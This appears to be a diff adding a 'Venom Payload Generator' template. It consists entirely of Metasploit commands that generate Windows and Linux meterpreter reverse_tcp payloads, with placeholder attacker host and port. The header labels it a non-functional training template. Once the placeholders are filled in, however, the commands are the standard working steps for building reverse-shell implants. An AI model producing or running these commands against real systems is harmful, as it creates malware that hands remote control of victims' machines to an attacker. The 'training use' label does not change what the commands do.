@@ -1,0 +1,13 @@
+# Venom Payload Generator Template
+# For Training Use – Non-functional Template
+
+use payload/windows/x64/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set EXITFUNC thread
+generate -f exe -o /tmp/payload.exe
+
+use payload/linux/x64/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+generate -f elf -o /tmp/payload.elf
